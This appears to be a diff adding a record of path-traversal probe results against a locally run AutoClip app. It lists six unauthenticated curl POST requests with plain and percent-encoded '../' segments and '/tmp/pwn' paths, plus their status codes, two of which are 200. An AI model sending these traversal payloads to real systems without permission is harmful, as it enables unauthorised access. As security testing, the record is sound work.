@@ -1,0 +1,11 @@
+Source: previously supplied terminal output from the isolated real AutoClip app.
+These results are recorded from that output; this script did not rerun the requests.
+Client used: curl --path-as-is
+Authentication headers/cookies: none sent.
+
+POST /api/v1/projects/../sync-data                  200
+POST /api/v1/projects/%2e%2e/sync-data              200
+POST /api/v1/projects/../../sync-data               404
+POST /api/v1/projects/../../../../tmp/pwn/sync-data 404
+POST /api/v1/projects/%2e%2e%2f%2e%2e/sync-data     404
+POST /api/v1/projects//tmp/pwn/sync-data            404
